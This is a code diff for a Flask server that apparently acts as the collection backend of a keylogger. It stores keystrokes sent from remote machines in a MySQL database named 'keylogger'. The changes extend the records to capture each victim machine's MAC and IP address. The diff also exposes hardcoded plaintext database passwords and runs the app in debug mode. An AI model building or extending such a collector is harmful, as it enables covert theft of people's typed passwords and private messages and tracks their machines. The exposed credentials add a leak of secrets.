@@ -11,7 +11,7 @@ CORS(app)
 db_config = {
     'host': 'kapelo.mysql.pythonanywhere-services.com',
     'user': 'kapelo',
-    'password': 'Juwela99237614',  # Votre mot de passe MySQL
+    'password': 'Babana36',  # Votre mot de passe MySQL
     'database': 'kapelo$keylogger'
 }
 
@@ -23,6 +23,8 @@ def init_db():
             CREATE TABLE IF NOT EXISTS keystrokes (
                 id INT AUTO_INCREMENT PRIMARY KEY,
                 machine_id VARCHAR(255),
+                mac_address VARCHAR(255),  -- Nouveau champ pour l'adresse MAC
+                ip_address VARCHAR(255),    -- Nouveau champ pour l'adresse IP
                 keystrokes TEXT,
                 timestamp DATETIME,
                 received_at DATETIME DEFAULT CURRENT_TIMESTAMP
@@ -59,10 +61,12 @@ def log_keys():
         cursor = conn.cursor()
         
         cursor.execute('''
-            INSERT INTO keystrokes (machine_id, keystrokes, timestamp)
-            VALUES (%s, %s, %s)
+            INSERT INTO keystrokes (machine_id, mac_address, ip_address, keystrokes, timestamp)
+            VALUES (%s, %s, %s, %s, %s)
         ''', (
             data['machine_id'],
+            data['mac_address'],  # Inclure l'adresse MAC
+            data['ip_address'],    # Inclure l'adresse IP
             data['keystrokes'],
             datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         ))
@@ -78,3 +82,6 @@ def log_keys():
 
 # Initialisation de la BD au démarrage
 init_db()
+
+if __name__ == '__main__':
+    app.run(debug=True)
